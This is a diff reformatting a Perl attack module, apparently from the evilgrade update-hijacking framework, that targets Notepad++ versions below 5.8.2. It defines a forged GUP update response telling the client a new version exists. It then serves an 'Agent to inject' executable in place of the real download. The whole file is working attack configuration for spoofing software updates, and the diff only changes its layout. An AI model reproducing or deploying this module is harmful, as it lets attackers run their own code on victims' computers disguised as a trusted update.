@@ -25,48 +25,55 @@ package modules::notepadplus;
 use strict;
 use Data::Dump qw(dump);
 
-my $base=
-{
-    'name' => 'notepadplus',
+my $base = {
+    'name'    => 'notepadplus',
     'version' => '1.0',
-    'appver' => '< 5.8.2',
-    'author' => [ 'Francisco Amato < famato +[AT]+ infobytesec.com>' ],
-    'description' => qq{The notepad++ use GUP generic update process so it''s boggy too.},    
-    'vh' => 'notepad-plus.sourceforge.net',
+    'appver'  => '< 5.8.2',
+    'author'  => ['Francisco Amato < famato +[AT]+ infobytesec.com>'],
+    'description' =>
+        qq{The notepad++ use GUP generic update process so it''s boggy too.},
+    'vh'      => 'notepad-plus.sourceforge.net',
     'request' => [
-		    {
-		    'req' => 'getDownLoadUrl.php', #regex friendly
-		    'type' => 'string', #file|string|agent|install
-		    'method' => '', #any
-		    'bin'    => '0',
-		    'string' => "<?xml version=\"1.0\"?>\n<GUP>\n\t<NeedToBeUpdated>yes</NeedToBeUpdated>\n\t<Version>1<%RND1%>.0.0</Version>\n\t<Location>http://notepad-plus.sourceforge.net/<%RND2%>.exe</Location>\n</GUP>",
-		    'parse' => '1',
-		    'file' => '',
-		    },
-		    {
-		    'req' => '.exe', #regex friendly
-		    'type' => 'agent', #file|string|agent|install
-		    'method' => '', #any
-		    'bin'    => 1,		    
-		    'string' => '',
-		    'parse' => '0',
-		    'file' => ''
-		    },
+        {   'req'    => 'getDownLoadUrl.php',    #regex friendly
+            'type'   => 'string',                #file|string|agent|install
+            'method' => '',                      #any
+            'bin'    => '0',
+            'string' =>
+                "<?xml version=\"1.0\"?>\n<GUP>\n\t<NeedToBeUpdated>yes</NeedToBeUpdated>\n\t<Version>1<%RND1%>.0.0</Version>\n\t<Location>http://notepad-plus.sourceforge.net/<%RND2%>.exe</Location>\n</GUP>",
+            'parse' => '1',
+            'file'  => '',
+        },
+        {   'req'    => '.exe',                  #regex friendly
+            'type'   => 'agent',                 #file|string|agent|install
+            'method' => '',                      #any
+            'bin'    => 1,
+            'string' => '',
+            'parse'  => '0',
+            'file'   => ''
+        },
     ],
-    #Options		    
-    'options' => {  'agent'  => { 'val' => './agent/agent.exe', 'desc' => 'Agent to inject'},
-		    'enable' => { 'val' => 1, 
-			    	  'desc' => 'Status'},
-                   'rnd1'  => { 'val' => 'isrcore::utils::RndNum(2)',
-                                 'hidden' => 1,
-				'dynamic' =>1,},
-                   'rnd2'  => { 'val' => 'isrcore::utils::RndAlpha(isrcore::utils::RndNum(1))',
-                                 'hidden' => 1,
-				'dynamic' =>1,},
-                                                                                       			    	  
-		 }
-};
 
+    #Options
+    'options' => {
+        'agent' =>
+            { 'val' => './agent/agent.exe', 'desc' => 'Agent to inject' },
+        'enable' => {
+            'val'  => 1,
+            'desc' => 'Status'
+        },
+        'rnd1' => {
+            'val'     => 'isrcore::utils::RndNum(2)',
+            'hidden'  => 1,
+            'dynamic' => 1,
+        },
+        'rnd2' => {
+            'val'    => 'isrcore::utils::RndAlpha(isrcore::utils::RndNum(1))',
+            'hidden' => 1,
+            'dynamic' => 1,
+        },
+
+    }
+};
 
 ##########################################################################
 # FUNCTION      new
